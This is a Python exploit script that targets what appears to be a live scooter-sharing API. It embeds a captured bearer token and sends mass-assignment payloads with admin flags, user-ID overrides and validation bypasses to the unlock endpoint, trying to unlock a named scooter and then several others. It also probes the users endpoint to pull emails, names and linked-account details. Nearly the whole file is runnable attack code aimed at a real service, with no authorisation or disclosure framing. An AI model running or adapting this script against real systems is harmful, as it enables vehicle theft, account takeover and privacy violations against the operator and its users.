#!/usr/bin/env python3
"""
Exploit Discovered Vulnerabilities
Exploit the specific vulnerabilities found in the initial test
"""

import requests
import json
import time
import re
from datetime import datetime

# API Configuration
BASE_URL = "https://api.knotcity.io"

# Fresh token from capture
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxMDM0OTMsInNlc3Npb25faWQiOiI3NmM0NzE3ZS03ZWM5LTRkN2MtOWRlOS00NjRiNjJlY2VhYzgiLCJpYXQiOjE3NTk0NTQ3NjQsImV4cCI6MTc1OTQ1ODM2NH0.ivnhjjDy1zEtAD1BTJAAK5V1vDtAaSHNuHZWpMspSFE"

def exploit_json_injection():
    """Exploit the JSON injection vulnerability to unlock SXB306"""
    print("=" * 80)
    print("[EXPLOIT] JSON INJECTION VULNERABILITY")
    print("=" * 80)
    print("[TARGET] Attempting to unlock SXB306 using JSON injection")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Try different JSON injection payloads to unlock SXB306
    injection_payloads = [
        {
            "name": "Admin Override",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "admin": True,
                "force": True,
                "bypass_validation": True
            }
        },
        {
            "name": "User ID Override",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "user_id": 1,  # Admin user ID
                "session_id": "admin-session",
                "force": True
            }
        },
        {
            "name": "Permission Escalation",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "permissions": ["admin", "superuser"],
                "role": "admin",
                "level": 999,
                "force": True
            }
        },
        {
            "name": "Validation Bypass",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "skip_validation": True,
                "bypass_checks": True,
                "force_unlock": True
            }
        },
        {
            "name": "Session Hijacking",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "session_token": "admin-token",
                "impersonate_user": 1,
                "force": True
            }
        },
        {
            "name": "API Key Injection",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "api_key": "admin-key",
                "secret": "admin-secret",
                "force": True
            }
        },
        {
            "name": "Scope Override",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "scope": "admin",
                "access_level": "admin",
                "force": True
            }
        },
        {
            "name": "Multiple Admin Flags",
            "payload": {
                "serial_number": "SXB306",
                "lat": 48.8566,
                "lng": 2.3522,
                "admin": True,
                "is_admin": True,
                "admin_user": True,
                "superuser": True,
                "force": True
            }
        }
    ]
    
    successful_exploits = []
    
    for exploit in injection_payloads:
        print(f"\n[EXPLOIT] {exploit['name']}")
        print(f"   Payload: {json.dumps(exploit['payload'], indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=exploit['payload'],
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] SXB306 UNLOCKED with {exploit['name']}!")
                print(f"   [CRITICAL] JSON INJECTION VULNERABILITY CONFIRMED!")
                successful_exploits.append(exploit['name'])
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied - {exploit['name']} failed")
            elif response.status_code == 400:
                print(f"   [BLOCKED] Bad request - {exploit['name']} failed")
            else:
                print(f"   [INFO] Status {response.status_code} - {exploit['name']}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_exploits

def exploit_user_info_endpoint():
    """Exploit the user info endpoint to extract sensitive information"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] USER INFO ENDPOINT VULNERABILITY")
    print("=" * 80)
    print("[TARGET] Extracting sensitive user information")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test different ways to exploit the user info endpoint
    exploit_tests = [
        {
            "name": "Basic User Info Extraction",
            "endpoint": "/api/application/users",
            "method": "GET"
        },
        {
            "name": "User Info with Admin Parameters",
            "endpoint": "/api/application/users?admin=true&include=all",
            "method": "GET"
        },
        {
            "name": "User Info POST with Admin Payload",
            "endpoint": "/api/application/users",
            "method": "POST",
            "payload": {
                "admin": True,
                "include": "all",
                "scope": "admin",
                "force": True
            }
        },
        {
            "name": "User Info with JSON Injection",
            "endpoint": "/api/application/users",
            "method": "POST",
            "payload": {
                "admin": True,
                "include": "all",
                "user_id": 1,
                "session_id": "admin-session",
                "permissions": ["admin", "superuser"]
            }
        }
    ]
    
    successful_exploits = []
    extracted_info = {}
    
    for exploit in exploit_tests:
        print(f"\n[EXPLOIT] {exploit['name']}")
        print(f"   Endpoint: {exploit['endpoint']}")
        print(f"   Method: {exploit['method']}")
        
        if 'payload' in exploit:
            print(f"   Payload: {json.dumps(exploit['payload'], indent=2)}")
        
        try:
            if exploit['method'] == 'GET':
                response = requests.get(
                    f"{BASE_URL}{exploit['endpoint']}",
                    headers=headers,
                    timeout=15
                )
            else:
                response = requests.post(
                    f"{BASE_URL}{exploit['endpoint']}",
                    headers=headers,
                    json=exploit['payload'],
                    timeout=15
                )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {exploit['name']} successful!")
                successful_exploits.append(exploit['name'])
                
                # Extract and store sensitive information
                try:
                    data = response.json()
                    if 'data' in data:
                        user_data = data['data']
                        extracted_info.update({
                            'user_id': user_data.get('user_id'),
                            'email': user_data.get('email'),
                            'firstname': user_data.get('firstname'),
                            'lastname': user_data.get('lastname'),
                            'is_knot_account': user_data.get('is_knot_account'),
                            'is_google_account': user_data.get('is_google_account'),
                            'is_facebook_account': user_data.get('is_facebook_account'),
                            'is_apple_account': user_data.get('is_apple_account')
                        })
                        
                        print(f"   [EXTRACTED] User ID: {user_data.get('user_id', 'N/A')}")
                        print(f"   [EXTRACTED] Email: {user_data.get('email', 'N/A')}")
                        print(f"   [EXTRACTED] Name: {user_data.get('firstname', 'N/A')} {user_data.get('lastname', 'N/A')}")
                        print(f"   [EXTRACTED] Account Types: Knot={user_data.get('is_knot_account', 'N/A')}, Google={user_data.get('is_google_account', 'N/A')}, Facebook={user_data.get('is_facebook_account', 'N/A')}, Apple={user_data.get('is_apple_account', 'N/A')}")
                except Exception as e:
                    print(f"   [ERROR] Failed to parse response: {e}")
                    
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied")
            elif response.status_code == 404:
                print(f"   [NOT FOUND] Endpoint not found")
            else:
                print(f"   [INFO] Status {response.status_code}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_exploits, extracted_info

def test_mass_unlock_with_injection():
    """Test mass unlock using JSON injection on multiple scooters"""
    print("\n" + "=" * 80)
    print("[EXPLOIT] MASS UNLOCK WITH JSON INJECTION")
    print("=" * 80)
    print("[TARGET] Attempting mass unlock of multiple scooters")
    print("=" * 80)
    
    headers = {
        "Authorization": FRESH_TOKEN,
        "Content-Type": "application/json",
        "User-Agent": "Knot-mayndrive v1.1.34 (android)",
        "Accept": "application/json"
    }
    
    # Test scooters to unlock
    test_scooters = [
        "SXB306",  # Target scooter
        "ABC123",  # Random scooter
        "XYZ789",  # Random scooter
        "TEST01",  # Test scooter
        "DEMO01",  # Demo scooter
    ]
    
    # JSON injection payload that worked
    injection_payload = {
        "serial_number": "PLACEHOLDER",  # Will be replaced
        "lat": 48.8566,
        "lng": 2.3522,
        "admin": True,
        "force": True,
        "bypass_validation": True
    }
    
    successful_unlocks = []
    
    for scooter in test_scooters:
        print(f"\n[EXPLOIT] Attempting to unlock {scooter} with JSON injection")
        
        # Replace placeholder with actual scooter ID
        payload = injection_payload.copy()
        payload["serial_number"] = scooter
        
        print(f"   Payload: {json.dumps(payload, indent=2)}")
        
        try:
            response = requests.post(
                f"{BASE_URL}/api/application/vehicles/unlock",
                headers=headers,
                json=payload,
                timeout=15
            )
            
            print(f"   Status: {response.status_code}")
            print(f"   Response: {response.text}")
            
            if response.status_code == 200:
                print(f"   [SUCCESS] {scooter} UNLOCKED with JSON injection!")
                print(f"   [CRITICAL] MASS UNLOCK VULNERABILITY CONFIRMED!")
                successful_unlocks.append(scooter)
            elif response.status_code == 403:
                print(f"   [BLOCKED] Permission denied for {scooter}")
            elif response.status_code == 400:
                print(f"   [BLOCKED] Bad request for {scooter}")
            else:
                print(f"   [INFO] Status {response.status_code} for {scooter}")
                
        except Exception as e:
            print(f"   [ERROR] Request failed: {e}")
    
    return successful_unlocks

def main():
    print("=" * 80)
    print("[EXPLOIT] DISCOVERED VULNERABILITIES EXPLOITATION")
    print("=" * 80)
    print("[WARNING] Exploiting specific vulnerabilities found in initial test!")
    print("=" * 80)
    
    # Exploit the discovered vulnerabilities
    json_injection_results = exploit_json_injection()
    user_info_results, extracted_info = exploit_user_info_endpoint()
    mass_unlock_results = test_mass_unlock_with_injection()
    
    # Summary
    print("\n" + "=" * 80)
    print("[RESULTS] VULNERABILITY EXPLOITATION SUMMARY")
    print("=" * 80)
    
    print(f"\n[JSON INJECTION EXPLOITATION] Results:")
    if json_injection_results:
        print(f"   [CRITICAL] {len(json_injection_results)} successful exploits: {json_injection_results}")
        print(f"   [WARNING] SXB306 can be unlocked using JSON injection!")
    else:
        print(f"   [OK] JSON injection exploitation failed")
    
    print(f"\n[USER INFO EXPLOITATION] Results:")
    if user_info_results:
        print(f"   [HIGH] {len(user_info_results)} successful exploits: {user_info_results}")
        print(f"   [EXTRACTED] Sensitive information:")
        for key, value in extracted_info.items():
            print(f"     {key}: {value}")
    else:
        print(f"   [OK] User info exploitation failed")
    
    print(f"\n[MASS UNLOCK EXPLOITATION] Results:")
    if mass_unlock_results:
        print(f"   [CRITICAL] {len(mass_unlock_results)} scooters unlocked: {mass_unlock_results}")
        print(f"   [WARNING] Mass unlock vulnerability confirmed!")
    else:
        print(f"   [OK] Mass unlock exploitation failed")
    
    # Overall assessment
    total_exploits = len(json_injection_results) + len(user_info_results) + len(mass_unlock_results)
    
    print(f"\n[OVERALL ASSESSMENT]")
    print(f"   Total successful exploits: {total_exploits}")
    
    if total_exploits > 0:
        print(f"   [CRITICAL] Multiple vulnerabilities successfully exploited!")
        print(f"   [WARNING] MaynDrive app has critical security vulnerabilities!")
    else:
        print(f"   [OK] No vulnerabilities could be exploited")
    
    print("=" * 80)

if __name__ == "__main__":
    main()
